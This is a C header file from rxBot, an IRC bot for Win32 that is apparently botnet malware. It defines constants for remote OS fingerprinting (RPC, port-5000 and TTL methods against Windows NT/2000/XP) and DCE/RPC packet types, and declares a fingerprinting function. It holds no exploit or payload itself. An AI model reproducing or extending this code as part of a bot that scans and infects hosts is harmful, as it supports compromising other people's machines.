/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

// OS fingerprint
#define FP_RPC     1
#define FP_PORT5K  2
#define FP_TTL     3

// Definitions for OS fingerprinting
#define OS_UNKNOWN 0
#define OS_WINNT   1
#define OS_WIN2K   2
#define OS_WINXP   3

#define FP_RPC     1
#define FP_PORT5K  2
#define FP_TTL     3

// DCE defines
#define DCE_VERSION_MAJOR 0x05
#define DCE_VERSION_MINOR 0x00
#define DCE_PKT_BIND 0x0B
#define DCE_PKT_BINDACK 0x0C
#define DCE_PKT_BINDNACK 0x0D
#define DCE_PKT_REQUEST 0x00
#define DCE_PKT_FAULT 0x03
#define DCE_PKT_RESPONSE 0x02
#define DCE_PKT_ALTCONT 0x0E
#define DCE_PKT_ALTCONTRESP 0x0F
#define DCE_PKT_BINDRESP 0x10
#define RPC_FLG_FIRST 0x01
#define RPC_FLG_LAST 0x02

bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen);
int FpHost(const char *szHost, int iFpType);
